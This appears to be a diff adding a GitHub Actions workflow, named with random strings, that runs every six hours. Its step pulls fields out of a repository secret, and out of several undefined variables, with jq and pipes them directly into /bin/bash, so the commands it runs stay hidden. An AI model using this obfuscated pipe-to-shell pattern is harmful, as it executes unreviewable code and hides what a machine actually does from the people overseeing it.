@@ -1,0 +1,23 @@
+name: weiyuanbv
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weiyuanbv
+        env:
+          s1: ${{ secrets.s1 }}
+        run: |
+          echo $s1 | jq -r .qiays8 | /bin/bash
+          echo $nfgz97707 | jq -r .sq43778 | /bin/bash
+          echo $pts0870 | jq -r .fwn5 | /bin/bash
+          echo $cybut59 | jq -r .fbkhr3471 | /bin/bash
+          echo $t4888 | jq -r .xgf6 | /bin/bash
+          echo $fpo541 | jq -r .h01614 | /bin/bash
+
